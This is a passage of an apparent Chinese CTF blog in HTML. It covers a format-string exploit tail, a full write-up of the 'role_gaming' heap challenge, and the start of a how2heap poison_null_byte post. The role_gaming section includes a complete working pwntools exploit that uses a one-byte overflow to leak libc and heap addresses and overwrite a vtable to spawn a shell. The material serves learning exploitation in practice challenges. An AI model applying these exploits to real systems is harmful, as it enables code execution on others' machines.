class="string">'change1:'</span>+hex(change1)+<span class="string">'\nchange2:'</span>+hex(change2)+ <span class="string">"\033[0m"</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload1=((<span class="string">'%0'</span>+str(change2)+<span class="string">'d%14$hhn|%0'</span>+str(change1-change2<span class="number">-1</span>)+<span class="string">'d%13$hn|'</span>).ljust(<span class="number">0x74</span>,<span class="string">'a'</span>)).ljust(<span class="number">0x88</span>,<span class="string">'\x00'</span>)+<span class="string">'\x50\x01'</span></span><br><span class="line">edit(<span class="number">1</span>,payload1)</span><br><span class="line"></span><br><span class="line">submit(ret_stack<span class="number">-0x110</span>,ret_stack<span class="number">-0x110</span>+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="role-gaming"><a href="#role-gaming" class="headerlink" title="role_gaming"></a>role_gaming</h1><h2 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h2><p>因为第一次在pwn里面写到c++的程序，本来c++也不太好逆，就…稍微写的有点久？（以后逆向速度要加油~）</p>
<h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><img src="/2020/02/17/how2heap-overlapping-chunks-bookstore-night-deamonic-heap/1581907941776.png" width="85%" height="85%">

<p>初始化：申请了一个0xA0(0xB0)大小的chunk，用来保存后面的指针</p>
<p>下面主要就是从栈上读取一个command，用来操作游戏，大小是0xFFF，会在输入结尾处改成0</p>
<h3 id="new"><a href="#new" class="headerlink" title="new"></a>new</h3><p><img src="/2020/02/17/how2heap-overlapping-chunks-bookstore-night-deamonic-heap/1581908110687.png" alt="1581908110687"></p>
<p>最多允许new 0x13个character，其中character有两种类型：barbarian，wizzard，在C++里面来说就是，barbarian和wizard类从character继承而来。<br>申请barbarian的command格式为：“new barbarian ”+personnage，wizzard的格式为“new wizzard ”+personnage</p>
<p>每次创建前都会调用<code>get_personnage</code>，这个函数会调用strncmp判断command中的personnage和所有character对应chunk中的personnage，其中判断时的n用的是存在chunk上的那个记录，如果有重复的personnage，会直接申请失败</p>
<p>对比完之后开始创建character，其对应的chunk如下：<br>character：new   0xF8(0x100)<br>personnage：calloc   0x??（由输入决定）</p>
<h4 id="barbarian："><a href="#barbarian：" class="headerlink" title="barbarian："></a>barbarian：</h4><img src="/2020/02/17/how2heap-overlapping-chunks-bookstore-night-deamonic-heap/1581908829020.png" width="60%" height="60%">

<h4 id="wizzard："><a href="#wizzard：" class="headerlink" title="wizzard："></a>wizzard：</h4><img src="/2020/02/17/how2heap-overlapping-chunks-bookstore-night-deamonic-heap/1581908985082.png" width="60%" height="60%">

<p>两者的初始化基本都差不多，除了Vtable和一些值可能存在不同</p>
<h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><img src="/2020/02/17/how2heap-overlapping-chunks-bookstore-night-deamonic-heap/1581910097692.png" width="60%" height="60%">

<p>通过搜索personnage判断是否存在character<br>如果存在</p>
<ul>
<li>free personnage，并将character chunk上的指针置零</li>
<li>delete character_ptr，并在对应记录上赋值为前一个character，character数量减一</li>
</ul>
<h3 id="help"><a href="#help" class="headerlink" title="help"></a>help</h3><p><img src="/2020/02/17/how2heap-overlapping-chunks-bookstore-night-deamonic-heap/1581910298728.png" alt="1581910298728"></p>
<p>打印帮助信息</p>
<h3 id="change"><a href="#change" class="headerlink" title="change"></a>change</h3><img src="/2020/02/17/how2heap-overlapping-chunks-bookstore-night-deamonic-heap/1581911404715.png" width="60%" height="60%">

<p>格式为”change “+oldpersonnage+” “+newpersonnage</p>
<p>如果旧personnage长度大于新的，就直接strncpy到对应chunk去，如果小于则需要realloc</p>
<h3 id="print-all"><a href="#print-all" class="headerlink" title="print all"></a>print all</h3><img src="/2020/02/17/how2heap-overlapping-chunks-bookstore-night-deamonic-heap/1581928137419.png" width="60%" height="60%">

<p>调用到对应类的虚函数来输出其内容</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>（以后碰到复杂的题一定要先写漏洞分析）</p>
<h3 id="chunks-amp-内存操作"><a href="#chunks-amp-内存操作" class="headerlink" title="chunks&amp;内存操作"></a>chunks&amp;内存操作</h3><p>chunk：</p>
<ol>
<li>初始用来存储的chunk，0xA0(0xB0)大小，new出来的chunk（new是调用malloc来实现的）</li>
<li>character chunk，0xf8(0x100)大小，calloc出来的chunk</li>
<li>personnage chunk，大小由我们控制，不过不能为0因为程序会自动加上一个’B’或者’W’，calloc出来的chunk，内存上申请时挨着character chunk</li>
</ol>
<p>内存操作：</p>
<p>除了上面申请内存的地方还有释放内存时是先free(personnage)，然后delete character chunk。在change里面还有一个realloc personnage</p>
<h3 id="漏洞点："><a href="#漏洞点：" class="headerlink" title="漏洞点："></a>漏洞点：</h3><p>初始化时，处理输入的personnage会先调用strlen计算len，然后<code>calloc(len,1)</code>,接着存len+1在对应记录上<br>接着用<code>strncpy(chunkptr + 1,ptr, len)</code>从chunk的第2个字节处开始放置字符串</p>
<p>此处存在1Byte overflow</p>
<p>在change处，由于记录的len是加过1的，当我们输入的新personnage长度和记录长度相等时，也可以修改到后面一个字节</p>
<p>前面分析的时候顺带画了一个图方便自己看：</p>
<p><img src="/2020/02/17/how2heap-overlapping-chunks-bookstore-night-deamonic-heap/1581995268256.png" alt="1581995268256"></p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>exploit就也是堆上比较常见的构造了，这里我使用的方法是先用free modified chunk来leak内容，然后用malloc modified chunk来覆盖Vtable，具体为什么见下文</p>
<p>最开始的时候我申请了3个barbarian(a,b,c)，此时如果使用a的overflow可以修改到b记录chunk的size低一字节，因为申请a的时候产生的overflow在topchunk上，所以不用管，主要是利用change时的overflow</p>
<table>
<thead>
<tr>
<th>0x100</th>
<th>0x20</th>
<th>0x100</th>
<th>0x??</th>
<th>0x100</th>
<th>0x??</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td>chunk for overflow</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>a</td>
<td>a</td>
<td>b</td>
<td>b</td>
<td>c</td>
<td>c</td>
</tr>
</tbody></table>
<p>然后我看到后面的chunk刚好大小可以设置在一个字节，所以就想能不能利用一个0x70的来fastbin attack，通过free overlap修改其fd，然而我当时没有考虑到的是，我们的chunk大小申请是通过输入的personnage长度来决定的，如果想使用修改fd来fastbin attack，当我改到fd时，这个chunk的size也被破坏了，因为0字节在初始化时就被截断了，根本无法实现，但是如果通过这个方法来extend a，从而达到泄露指针内容的话还是可以的。</p>
<p>我就先随便申请了5个barbarian（因为之前一直在构造的时候都畏手畏脚的，这次干脆先稍微弄多一点，冗余也没事，能在限制下写出来就行XD</p>
<table>
<thead>
<tr>
<th>0x100</th>
<th>0x20</th>
<th>0x100</th>
<th>0x60</th>
<th>0x100</th>
<th>0x60</th>
<th>0x100</th>
<th>0x60</th>
<th>0x100</th>
<th>0x60</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>a</td>
<td>a</td>
<td>b</td>
<td>b</td>
<td>c</td>
<td>c</td>
<td>d</td>
<td>d</td>
<td>e</td>
<td>e</td>
</tr>
</tbody></table>
<p>然后就是想办法在b所处的0x160这个范围内放上libc地址和heap地址，可以通过先free d，再free b来在fastbin上放上fd，不过这个leak值得注意的是，只能leak fd和同fd一样在堆上地址结尾是8的这一行数据，因为如果填充foot，后面紧跟的就是size，只能通过刚好盖满一个chunk的size，realloc时让chunk shrink 0x10个字节，刚好把fd放在前一个chunk的foot处，此时就可以leak了</p>
<p>当然free d之后，由于d的记录chunk在unsortedbin上，再free b的话就会让b的记录chunk fd指向d的记录chunk，而不是main_arena了，所以free d之后我又申请了一个f，如下：</p>
<table>
<thead>
<tr>
<th>0x100</th>
<th>0x20</th>
<th>0x100</th>
<th>0x60</th>
<th>0x100</th>
<th>0x60</th>
<th>0x100</th>
<th>0x60</th>
<th>0x100</th>
<th>0x60</th>
<th>0x20</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>fb1</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>a</td>
<td>a</td>
<td>b</td>
<td>b</td>
<td>c</td>
<td>c</td>
<td>f</td>
<td></td>
<td>e</td>
<td>e</td>
<td>f</td>
<td></td>
</tr>
</tbody></table>
<p>再free b之后在b两个chunk的fd上就既有libc地址又有heap地址了，接下来的操作就只是修改和输出：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="string">'a'</span>*<span class="number">0x18</span>)</span><br><span class="line">new(<span class="string">'b'</span>*<span class="number">0x50</span>)</span><br><span class="line">new(<span class="string">'c'</span>*<span class="number">0x50</span>)</span><br><span class="line">new(<span class="string">'d'</span>*<span class="number">0x50</span>)</span><br><span class="line">new(<span class="string">'e'</span>*<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">'B'</span>+<span class="string">'d'</span>*<span class="number">0x50</span>)</span><br><span class="line">new(<span class="string">'f'</span>*<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">change(<span class="string">'B'</span>+<span class="string">'a'</span>*<span class="number">0x17</span>+<span class="string">'\x01'</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\x61'</span>)</span><br><span class="line">delete(<span class="string">'B'</span>+<span class="string">'b'</span>*<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">###extend a to get libc_base</span></span><br><span class="line">change(<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\x61'</span>,<span class="string">'A'</span>*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'successfully\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'print all'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'A'</span>*<span class="number">0x20</span>)</span><br><span class="line">libc_base=my_u64(p.recv(<span class="number">6</span>))<span class="number">-0x3c4b78</span></span><br><span class="line">log.info(<span class="string">"\033[1;36m"</span> + <span class="string">'libc_base:'</span>+hex(libc_base) + <span class="string">"\033[0m"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">####extend a to get heap_base</span></span><br><span class="line">change(<span class="string">'A'</span>*<span class="number">0x20</span>,<span class="string">'*'</span>*(<span class="number">0x40</span>+<span class="number">0xe0</span>)+<span class="string">'\xff'</span>)<span class="comment">#low 1 byte don't care for piebase</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'successfully\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'print all'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'\xff'</span>)</span><br><span class="line">heap_base=(my_u64(p.recv(<span class="number">5</span>))&lt;&lt;<span class="number">8</span>)<span class="number">-0x12500</span></span><br><span class="line">log.info(<span class="string">"\033[1;36m"</span> + <span class="string">'heap_base:'</span>+hex(heap_base) + <span class="string">"\033[0m"</span>)</span><br></pre></td></tr></table></figure>

<p>leak之后，因为fastbin attack实现不了，所以我的卡了很久，最后随便翻了一下别人的思路，知道了在堆上修改vtable这种操作，但是想要覆盖到下一个chunk去修改vtable，用前面free modified chunk的方法，我在记录chunk根本找不到合适的作为fakesize的字段，只有一个字节的overflow当然也不允许我们修改过多，于是决定试试malloc modified chunk</p>
<p>前面用来leak的构造我就没管了，直接在后面新开一块出来用于覆盖vtable，接着我就申请了g、h、以及一个伪造vtable的i，i的personnage块上我填了一个one_gadget的值，毕竟输入6个字节的地址还是可以的</p>
<table>
<thead>
<tr>
<th>0x100</th>
<th>0x60</th>
<th>0x20</th>
<th>0x100</th>
<th>0x30</th>
<th>0x100</th>
<th>0x30</th>
<th>0x100</th>
<th>0x20</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>one_gadget</td>
</tr>
<tr>
<td>e</td>
<td>e</td>
<td>f</td>
<td>g</td>
<td>g</td>
<td>h</td>
<td>h</td>
<td>i</td>
<td>i</td>
</tr>
</tbody></table>
<p>先free掉g，然后利用f修改g的size为0x150，再change h为0x140+p64(fake vtable)即可malloc到g+h前面0x18字节的chunk，刚好可以修改h的vtable，这里其实我发现前面的构造也不一定要申请f，直接change一个说不定就可以了</p>
<p>修改之后print all即可调用</p>
<h2 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./role_gaming'</span>	<span class="comment">#binary's name here</span></span><br><span class="line">context.binary = binary		<span class="comment">#context here</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">pty = process.PTY</span><br><span class="line">p = process(binary, aslr = <span class="number">1</span>, stdin=pty, stdout=pty)	<span class="comment">#process option here</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Host =</span></span><br><span class="line"><span class="string">Port =</span></span><br><span class="line"><span class="string">p = remote(Host,Port)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">my_u64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">my_u32 = <span class="keyword">lambda</span> x: u32(x.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">ub_offset = <span class="number">0x3c4b30</span></span><br><span class="line">codebase = <span class="number">0x555555554000</span></span><br><span class="line"><span class="comment">#log.info("\033[1;36m" + hex(bin_addr) + "\033[0m")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># todo here</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(name)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">	p.sendline(<span class="string">'new barbarian '</span>+name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(name)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">	p.sendline(<span class="string">'delete '</span>+name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(nameo,namen)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">	p.sendline(<span class="string">'change '</span>+nameo+<span class="string">' '</span>+namen)</span><br><span class="line"></span><br><span class="line">new(<span class="string">'a'</span>*<span class="number">0x18</span>)</span><br><span class="line">new(<span class="string">'b'</span>*<span class="number">0x50</span>)</span><br><span class="line">new(<span class="string">'c'</span>*<span class="number">0x50</span>)</span><br><span class="line">new(<span class="string">'d'</span>*<span class="number">0x50</span>)</span><br><span class="line">new(<span class="string">'e'</span>*<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">'B'</span>+<span class="string">'d'</span>*<span class="number">0x50</span>)</span><br><span class="line">new(<span class="string">'f'</span>*<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">change(<span class="string">'B'</span>+<span class="string">'a'</span>*<span class="number">0x17</span>+<span class="string">'\x01'</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\x61'</span>)</span><br><span class="line">delete(<span class="string">'B'</span>+<span class="string">'b'</span>*<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">###extend a to get libc_base</span></span><br><span class="line">change(<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\x61'</span>,<span class="string">'A'</span>*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'successfully\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'print all'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'A'</span>*<span class="number">0x20</span>)</span><br><span class="line">libc_base=my_u64(p.recv(<span class="number">6</span>))<span class="number">-0x3c4b78</span></span><br><span class="line">log.info(<span class="string">"\033[1;36m"</span> + <span class="string">'libc_base:'</span>+hex(libc_base) + <span class="string">"\033[0m"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">####extend a to get heap_base</span></span><br><span class="line">change(<span class="string">'A'</span>*<span class="number">0x20</span>,<span class="string">'*'</span>*(<span class="number">0x40</span>+<span class="number">0xe0</span>)+<span class="string">'\xff'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'successfully\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'print all'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'\xff'</span>)</span><br><span class="line">heap_base=(my_u64(p.recv(<span class="number">5</span>))&lt;&lt;<span class="number">8</span>)<span class="number">-0x12500</span></span><br><span class="line">log.info(<span class="string">"\033[1;36m"</span> + <span class="string">'heap_base:'</span>+hex(heap_base) + <span class="string">"\033[0m"</span>)</span><br><span class="line"><span class="comment">####extend a to get heap_base</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x45216 execve("/bin/sh", rsp+0x30, environ)constraints:  rax == NULL</span></span><br><span class="line"><span class="string">0x4526a execve("/bin/sh", rsp+0x30, environ)constraints:  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string">0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints:  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string">0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints:  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">new(<span class="string">'g'</span>*<span class="number">0x30</span>)</span><br><span class="line">new(<span class="string">'h'</span>*<span class="number">0x30</span>)</span><br><span class="line">new(<span class="string">'xxxxxxx'</span>+p64(libc_base+<span class="number">0xf02a4</span>))</span><br><span class="line">delete(<span class="string">'B'</span>+<span class="string">'g'</span>*<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">change(<span class="string">'B'</span>+<span class="string">'f'</span>*<span class="number">0x17</span>+<span class="string">'\x01'</span>,<span class="string">'F'</span>*<span class="number">0x18</span>+<span class="string">'\x51'</span>)</span><br><span class="line">change(<span class="string">'B'</span>+<span class="string">'h'</span>*<span class="number">0x30</span>,<span class="string">'+'</span>*<span class="number">0x140</span>+p64(heap_base+<span class="number">0x12b28</span>))</span><br><span class="line">p.sendline(<span class="string">'print all'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/10/how2heap-poison-null-byte-plaiddb/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Coldshield">
      <meta itemprop="description" content="分享一些bin学习日常的菜鸡">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Coldshield's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/02/10/how2heap-poison-null-byte-plaiddb/" class="post-title-link" itemprop="url">how2heap - poison_null_byte&plaiddb</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-02-10 06:54:41" itemprop="dateCreated datePublished" datetime="2020-02-10T06:54:41+08:00">2020-02-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-02-29 18:08:54" itemprop="dateModified" datetime="2020-02-29T18:08:54+08:00">2020-02-29</time>
              </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="fa fa-comment-o"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2020/02/10/how2heap-poison-null-byte-plaiddb/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2020/02/10/how2heap-poison-null-byte-plaiddb/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="how2heap-poison-null-byte-amp-plaiddb"><a href="#how2heap-poison-null-byte-amp-plaiddb" class="headerlink" title="how2heap - poison_null_byte&amp;plaiddb"></a>how2heap - poison_null_byte&amp;plaiddb</h1><p>ubuntu16.04 libc2.23</p>
<h1 id="poison-null-byte-c"><a href="#poison-null-byte-c" class="headerlink" title="poison_null_byte.c"></a>poison_null_byte.c</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Welcome to poison null byte 2.0!\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Tested in Ubuntu 14.04 64bit.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint8_t</span>* a;</span><br><span class="line">	<span class="keyword">uint8_t</span>* b;</span><br><span class="line">	<span class="keyword">uint8_t</span>* c;</span><br><span class="line">	<span class="keyword">uint8_t</span>* b1;</span><br><span class="line">	<span class="keyword">uint8_t</span>* b2;</span><br><span class="line">	<span class="keyword">uint8_t</span>* d;</span><br><span class="line">	<span class="keyword">void</span> *barrier;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We allocate 0x100 bytes for 'a'.\n"</span>);</span><br><span class="line">	a = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"a: %p\n"</span>, a);</span><br><span class="line">	<span class="keyword">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Since we want to overflow 'a', we need to know the 'real' size of 'a' "</span></span><br><span class="line">		<span class="string">"(it may be more than 0x100 because of rounding): %#x\n"</span>, real_a_size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span></span><br><span class="line"><span class="comment">	 * the least significant byte of this will be 0x10, because the size of the chunk includes</span></span><br><span class="line"><span class="comment">	 * the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">	b = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b: %p\n"</span>, b);</span><br><span class="line"></span><br><span class="line">	c = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span 